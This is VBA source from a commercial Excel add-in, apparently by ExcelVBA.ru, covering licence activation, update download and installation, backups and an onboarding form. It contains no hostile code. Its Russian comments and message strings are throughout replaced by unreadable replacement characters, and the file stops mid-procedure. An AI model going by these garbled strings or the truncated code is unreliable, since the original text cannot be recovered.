    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| filename$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DestCharset$ (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    With CreateObject("ADODB.Stream")
        .Type = 2
        If Len(SourceCharset$) Then .Charset = SourceCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Open
        .LoadFromFile filename$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        FileContent$ = .ReadText        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileContent$
        .Close
        .Charset = DestCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Open
        .WriteText FileContent$
        .SaveToFile filename$, 2        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Close
    End With
    ChangeFileCharset = Err = 0
End Function

Function temp_folder$()
    On Error Resume Next
    temp_folder$ = Environ("TEMP") & "\ExcelTemporaryFiles\"
    If Dir(temp_folder$, vbDirectory) = "" Then MkDir temp_folder$
End Function

Function temp_filename$()
    On Error Resume Next: Dim iter&
get_rnd:     iter& = iter& + 1: txt$ = Left(Rnd(Now) * 1E+15, 10)
    temp_filename$ = temp_folder$ & "temp_file_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "__" & txt$
    If Dir(temp_filename$, vbNormal) <> "" Then If iter& < 5 Then GoTo get_rnd
End Function


Function FolderExists(ByVal folder$) As Boolean
    On Error Resume Next: FolderExists = CreateObject("Scripting.FileSystemObject").FolderExists(folder$)
End Function
Function FileExists(ByVal filename$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(filename$)
End Function
Attribute VB_Name = "F_About"
Attribute VB_Base = "0{0E74D3C3-0954-4B39-B832-1C44BA62992B}{CEEC4468-2BD2-4463-A10C-EA137E68308B}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Form      : F_About
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 03.12.2011
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Excel, Word, CorelDRAW. |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------
Option Compare Text
Const FORM_VERSION = 5

Private Sub UserForm_Initialize()
    On Error Resume Next
    If Developer Then
        Me.Label_VERSION.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & FORM_VERSION & ", |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & MODULE_VERSION
    End If
    Me.MultiPage1.Value = 0: MultiPage1_Change
    For Each item In Array("", "Alfa", "Beta", "RC", "RC2", "RC3", "RC4", "RC5", "RC6"): Me.ComboBox_CurrentVersionType.AddItem item: Next
    FillVersions
    Me.Label_RegHyperlink.ControlTipText = Split(REG_HYPERLINK$, "&")(0) ' Replace(REG_HYPERLINK$, "&", "&&")
    Me.Label_EULA.ControlTipText = Split(EULA_HYPERLINK$, "?")(0)
    Me.Label_HowMuch.ControlTipText = Split(REG_HYPERLINK$, "&")(0)  'Replace(REG_HYPERLINK$, "&", "&&")
    Me.Label_ProgramFullname = PROJECT_FULLNAME$
    If FullLicense Then Me.MultiPage1.Pages("Page_RegInfo").Visible = Developer
    Me.MultiPage1.Pages("Page_CreateUpdate").Visible = Developer
    Me.CommandButton_ClearAllSettings.Visible = Developer

    Me.CommandButton_ShowGreeting.Visible = IsObject(F_Greeting)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)
End Sub

Private Sub CheckBox_Autorun_Click()
    AddinAutoRun Not (Me.CheckBox_Autorun.Value)
End Sub

Private Sub CheckBox_InstallUpdatesAutomatically_Click()
    WSP 5, CLng(Me.CheckBox_InstallUpdatesAutomatically.Value)
    Me.OptionButton_AutoUpdate_AnyVersion.Enabled = Me.CheckBox_InstallUpdatesAutomatically
    Me.OptionButton_AutoUpdate_StableOnly.Enabled = Me.CheckBox_InstallUpdatesAutomatically
End Sub

Private Sub CommandButton_ActivateProgram_Click()
    Dim msg$, res As Boolean
    code$ = Trim(Me.TextBox_ActivationCode)
    If code$ Like "*@*.*" Then
        res = GSNUE_(code$, msg$)
    Else
        res = ValidateAC(code$, msg$)
    End If
    If Len(msg) Then MsgBox msg, IIf(res, vbInformation, vbExclamation), _
       IIf(res, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!")
    Me.MultiPage1.Value = 0
End Sub

Private Sub CommandButton_ClearAllSettings_Click()
    On Error Resume Next: RegistryInfo "": SP_FILE ""
    File$ = SP_FILE("filename"): SetAttr File$, vbNormal: Kill File$
    RE_$ " ": AC_$ "---"
    DoEvents
    Me.MultiPage1.Value = 0
    ND "clear all settings", CountersCurrentValues
End Sub
Private Sub CommandButton_CreateBackup_Click()
    backupPath$ = BackupThisFile
    RefreshBackupsList
    Me.Repaint: DoEvents
End Sub
Private Sub CommandButton_InstallIntoAddinsFolder_Click()
    SaveAddinToPermanentPath True
    Me.CommandButton_InstallIntoAddinsFolder.Visible = False
End Sub
Private Sub CommandButton_RestoreLastBackup_Click()
    RestoreLastBackup
    RefreshBackupsList
    Me.Repaint: DoEvents
End Sub

Private Sub CommandButton_ShowGreeting_Click()
    On Error Resume Next
    If IsObject(F_Greeting) Then
        Me.Hide
        ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| '|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|'" & vbLf & CountersCurrentValues
        F_Greeting.Show
    End If
End Sub

Private Sub CommandButton_Uninstall_Click()
    UninstallThisFile
End Sub

Private Sub Label_DEMO_Click()
    On Error Resume Next
    Me.TextBox_ActivationCode = DEMO_ACTIVATION_CODE$
    Me.CommandButton_ActivateProgram.SetFocus
End Sub

Private Sub Label_EULA_Click()
    On Error Resume Next: CreateObject("wscript.Shell").Run EULA_HYPERLINK$
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| EULA - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
End Sub

Private Sub Label_EULA_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_EULA.ForeColor = 49152: Me.Label_ProgramWebPage.ForeColor = 16711680
End Sub

Private Sub OptionButton_AutoUpdate_AnyVersion_Click(): WSP 6, 0: End Sub
Private Sub OptionButton_AutoUpdate_StableOnly_Click(): WSP 6, -1: End Sub
Private Sub TextBox_HC1_Change(): Me.CommandButton_ChangeCurrentVersion.Enabled = True: End Sub
Private Sub TextBox_HC2_Change(): Me.CommandButton_ChangeCurrentVersion.Enabled = True: End Sub

Private Sub CommandButton_ChangePROJECT_NAME_Click()
    SHV "PROJECT_NAME", Trim(Me.TextBox_PROJECT_NAME)
    Me.Label_RegHyperlink.ControlTipText = Replace(REG_HYPERLINK$, "&", "&&")
    ThisWorkbook.Save
End Sub
Private Sub CommandButton_ClearUpdatesList_Click()
    msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd| |fffd||fffd||fffd||fffd||fffd| info.xml" & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Sub
    CreateUpdateXMLfile
    UploadNewVersion ""
End Sub
Private Sub CommandButton_CreateUpdate_Click()
    If Me.CommandButton_ChangeCurrentVersion.Enabled Then
        SetVersion Me.ScrollBar_CurrentVersionNumber
        Me.CommandButton_ChangeCurrentVersion.Enabled = False
        SHV "h_c1", Val(Me.TextBox_HC1): SHV "h_c2", Val(Me.TextBox_HC2)
    End If
    ThisWorkbook.Save
    VersionNumber& = GetVersion
    VersionName$ = GetVersionTXT(VersionNumber&)
    Description$ = Trim(Me.TextBox_NewVersionChanges)
    UploadNewUpdate VersionName$, VersionNumber&, Description$, Me.CheckBox_PublishComment
End Sub
Private Sub CommandButton_InstallUpdate_Click()
    Link$ = Me.ListBox_AvailableUpdates.list(Me.ListBox_AvailableUpdates.ListIndex, 5)
    If Link$ Like UPDATE_FOLDER$ & "*" Then InstallUpdate Link$
End Sub

Private Sub Label_DownloadSelectedUpdate_Click()
    On Error Resume Next
    CreateObject("wscript.Shell").Run Me.Label_DownloadSelectedUpdate.Tag
End Sub
Private Sub Label_ProgramFullname_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    If Shift = 7 And Button = 1 Then
        res = InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd|" & PROJECT_NAME$ & "|fffd|)", _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Me.Label_ProgramFullname.Caption)
        If res = "" Then Exit Sub
        Me.Label_ProgramFullname.Caption = res
        Me.Repaint: DoEvents
        ThisWorkbook.BuiltinDocumentProperties("Title") = res
        ThisWorkbook.Save
    End If
End Sub
Private Sub Label_RegHyperlink_Click()
    On Error Resume Next: hl$ = REG_HYPERLINK$
    If Len(hl$) Then CreateObject("wscript.Shell").Run hl$
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2"
End Sub
Private Sub ListBox_AvailableUpdates_Change()
    On Error Resume Next
    descr$ = Me.ListBox_AvailableUpdates.list(Me.ListBox_AvailableUpdates.ListIndex, 4)
    Me.TextBox_SelectedUpdateInfo = IIf(Len(descr$), descr$, "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>")

    Link$ = Me.ListBox_AvailableUpdates.list(Me.ListBox_AvailableUpdates.ListIndex, 5)
    ver$ = Me.ListBox_AvailableUpdates.list(Me.ListBox_AvailableUpdates.ListIndex, 2)
    verNumber& = Val(Me.ListBox_AvailableUpdates.list(Me.ListBox_AvailableUpdates.ListIndex, 3))

    Me.Label_DownloadSelectedUpdate.Tag = Link$
    Me.Label_DownloadSelectedUpdate.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & ver$
    Me.Label_DownloadSelectedUpdate.ControlTipText = Link$

    Me.CommandButton_InstallUpdate.Visible = True
    If verNumber& Mod 10 = 0 Then verNumber& = verNumber& + 9
    Select Case verNumber&
        Case Is > GetVersion
            Me.CommandButton_InstallUpdate.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & GetVersionTXT(verNumber&)
            Me.CommandButton_InstallUpdate.BackColor = vbGreen
        Case GetVersion
            Me.CommandButton_InstallUpdate.Visible = False
        Case Is < GetVersion
            Me.CommandButton_InstallUpdate.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & GetVersionTXT(verNumber&)
            Me.CommandButton_InstallUpdate.BackColor = vbRed
    End Select
End Sub
Private Sub TextBox_ActivationCode_Change()
    Me.CommandButton_ActivateProgram.Enabled = Len(Trim(Me.TextBox_ActivationCode)) > 0
End Sub
Private Sub TextBox_PROJECT_NAME_Change()
    If Me.TextBox_PROJECT_NAME <> PROJECT_NAME Then Me.TextBox_PROJECT_NAME.BackColor = vbWhite
    Me.CommandButton_ChangePROJECT_NAME.Enabled = (Me.TextBox_PROJECT_NAME <> PROJECT_NAME) And Len(Trim(Me.TextBox_PROJECT_NAME)) > 0
End Sub
Sub MultiPage1_Change()
    On Error Resume Next
    Me.Caption = Me.MultiPage1.Pages(Me.MultiPage1.Value).Tag
    Select Case Me.MultiPage1.Pages(Me.MultiPage1.Value).Name
        Case "Page_About"
            info$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & GetVersionTXT(GetVersion) & "   |fffd||fffd| " & _
                    ThisWorkbook.BuiltinDocumentProperties("Creation Date")
            Me.Label_VersionNumberAndDate.Caption = info$
            Dim response$, res As Boolean: res = CAC_(response$)
            Me.Label_LicenceInformation = response$
            Me.Label_LicenceInformation.ForeColor = IIf(res, RGB(0, 150, 0), vbRed)
            Me.Label_ProgramWebPage.ControlTipText = Split(PROGRAM_HYPERLINK$, "?")(0)
        Case "Page_RegInfo"
            Me.TextBox_ProgramCodeName = PROJECT_NAME$
            Me.TextBox_HID = HID$
        Case "Page_Updates"
            FillAvailableUpdatesList
            Me.ListBox_AvailableUpdates.SetFocus
            If CBool(Val(RSP(6))) Then Me.OptionButton_AutoUpdate_StableOnly = True Else Me.OptionButton_AutoUpdate_AnyVersion = True
            Me.CheckBox_InstallUpdatesAutomatically.Value = CBool(Val(RSP(5)))
            Me.OptionButton_AutoUpdate_AnyVersion.Enabled = Me.CheckBox_InstallUpdatesAutomatically
            Me.OptionButton_AutoUpdate_StableOnly.Enabled = Me.CheckBox_InstallUpdatesAutomatically
        Case "Page_History"
            Me.TextBox_History = VersionsHistory
            Me.TextBox_History.SetFocus
        Case "Page_CreateUpdate"
            Me.TextBox_PROJECT_NAME = PROJECT_NAME$
            FillVersions
        Case "Page_Options"
            RefreshBackupsList
            Me.CheckBox_Autorun.Value = AutorunStatus
            Me.CommandButton_InstallIntoAddinsFolder.Visible = Not (ThisWorkbook.FullName Like Application.UserLibraryPath & "*")
    End Select
End Sub
Private Sub CommandButton_Close_Click(): Unload Me: End Sub
Sub RefreshBackupsList()
    On Error Resume Next
    Me.ListBox_Backups.Clear
    ReDim BUarr(0 To 1, 0 To 1)
    PrevBackup$ = GetSetting(PROJECT_NAME$, "Setup", "PrevBackup", "")
    LastBackup$ = GetSetting(PROJECT_NAME$, "Setup", "LastBackup", "")

    tmp_folder$ = Environ("temp")
    BUarr(0, 0) = IIf(Len(LastBackup$), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "")
    BUarr(0, 1) = Replace(LastBackup$, tmp_folder$, "%temp%")  'Dir(LastBackup$)
    BUarr(1, 0) = IIf(Len(PrevBackup$), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "")
    BUarr(1, 1) = Replace(PrevBackup$, tmp_folder$, "%temp%")   'Dir(PrevBackup$)
    Me.ListBox_Backups.list = BUarr
End Sub

Sub FillAvailableUpdatesList()
    On Error Resume Next
    Me.Frame_Updates.Visible = False: Me.CommandButton_InstallUpdate.Visible = False
    Me.Label_CheckUpdatesStatus.Caption = " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    Dim UpdatesList
    Me.Label_CheckUpdatesStatus.Caption = CheckForAvailableUpdates(UpdatesList)
    Me.ListBox_AvailableUpdates.list = UpdatesList

    If Me.ListBox_AvailableUpdates.ListCount > 0 Then
        Me.ListBox_AvailableUpdates.ListIndex = 0
        Me.Frame_Updates.Visible = True
    End If
End Sub
Private Sub Label_WhiteField_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_HyperlinkWebsite.ForeColor = 16711680: Me.Label_ProgramWebPage.ForeColor = 16711680
    Me.Label_EULA.ForeColor = 16711680: Me.Label_HowMuch.ForeColor = 16711680
End Sub
Private Sub Label_HyperlinkWebsite_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_HyperlinkWebsite.ForeColor = 49152  ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
End Sub
Private Sub Label_ProgramWebPage_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_ProgramWebPage.ForeColor = 49152  ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Me.Label_EULA.ForeColor = 16711680
End Sub
Private Sub Label_HowMuch_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_HowMuch.ForeColor = 49152  ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Me.Label_EULA.ForeColor = 16711680
End Sub
Private Sub Label_Copyright_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    Me.Label_HyperlinkWebsite.ForeColor = 16711680
End Sub
Private Sub Label_HyperlinkWebsite_Click()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
    CreateObject("wscript.Shell").Run Me.Label_HyperlinkWebsite.Caption
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| ExcelVBA.ru - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
End Sub
Private Sub Label_HowMuch_Click()
    On Error Resume Next: hl$ = REG_HYPERLINK$
    If Len(hl$) Then CreateObject("wscript.Shell").Run hl$
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
End Sub
Private Sub Label_ProgramWebPage_Click()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: CreateObject("wscript.Shell").Run PROGRAM_HYPERLINK$
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
End Sub
Private Sub Label_SendEmail_Click()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: CreateObject("wscript.Shell").Run "mailto:order@ExcelVBA.ru"
    ND "form About", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
End Sub
Sub FillVersions()
    On Error Resume Next: Me.ScrollBar_CurrentVersionNumber = GetVersion
    CurrentVersionType = Me.ScrollBar_CurrentVersionNumber Mod 10: If CurrentVersionType = 9 Then CurrentVersionType = 0
    Me.ComboBox_CurrentVersionType.ListIndex = CurrentVersionType
    If Developer Then Me.TextBox_HC1 = Val(GHV("h_c1")): Me.TextBox_HC2 = Val(GHV("h_c2"))

    Me.TextBox_PROJECT_NAME = PROJECT_NAME
    Me.CommandButton_ChangeCurrentVersion.Enabled = False
End Sub

Private Sub ComboBox_CurrentVersionType_Change()
    ver& = Me.ScrollBar_CurrentVersionNumber
    ver& = (ver \ 10) * 10 + Me.ComboBox_CurrentVersionType.ListIndex
    Me.ScrollBar_CurrentVersionNumber = ver&
End Sub

Private Sub CommandButton_ChangeCurrentVersion_Click()
    SetVersion Me.ScrollBar_CurrentVersionNumber
    Me.CommandButton_ChangeCurrentVersion.Enabled = False
    SHV "h_c1", Val(Me.TextBox_HC1): SHV "h_c2", Val(Me.TextBox_HC2)
    ThisWorkbook.Save
End Sub

Private Sub ScrollBar_CurrentVersionNumber_Change()
    On Error Resume Next
    ver& = Me.ScrollBar_CurrentVersionNumber
    Me.TextBox1_CurrentVersion = ver& \ 1000 & "." & Right(ver& \ 100, 1) & "." & Right(ver& \ 10, 1)
    Me.CommandButton_ChangeCurrentVersion.Enabled = True
    txt = GetOldVersionDescription(ver&)
    Me.TextBox_NewVersionChanges = txt
End Sub


Attribute VB_Name = "F_Greeting"
Attribute VB_Base = "0{52BE3BED-4CD5-4FFE-AAD2-6F4980825298}{7B47F3A0-7063-466D-AFA4-F457E67EED67}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Dim TestDone As Boolean, StartTestTime As Date

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Private Sub CommandButton_Done_Click()
    If Not TestDone Then
        msg$ = "|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
               "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
               "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|?" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|?"
        If StartTestTime > 0 Then dt = Format(Now - StartTestTime, "hh:nn:ss")
        If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then
            'ND "stop test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Exit Sub
        End If
        'ND "stop test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & dt
    End If
    Unload Me
End Sub


Private Sub CommandButton_NextStep_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage1.Value = Me.MultiPage1.Value + 1
    Me.CommandButton_PrevStep.Enabled = True
    Me.CommandButton_Done.Enabled = Me.MultiPage1.Value = Me.MultiPage1.Pages.Count - 1
    Me.CommandButton_NextStep.Enabled = Me.MultiPage1.Value < Me.MultiPage1.Pages.Count - 1
    If Me.MultiPage1.Value = 3 Then StartTestTime = Now
End Sub

Private Sub CommandButton_OnlineHelp_Click()
    On Error Resume Next
    ThisWorkbook.FollowHyperlink "http://excelvba.ru/programmes/FillDocuments"
End Sub

Private Sub CommandButton_OpenSourceTable_Click()
    On Error Resume Next
    res = DownloadAndOpenExcelTable
    'ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel" & ", res = " & res
    Me.CommandButton_DownloadTemplates.Enabled = res
End Sub

Private Sub CommandButton_PrevStep_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage1.Value = Me.MultiPage1.Value - 1
    Me.CommandButton_NextStep.Enabled = True
    Me.CommandButton_Done.Enabled = False
    Me.CommandButton_PrevStep.Enabled = Me.MultiPage1.Value > 0
End Sub

Private Sub CommandButton_DownloadTemplates_Click()
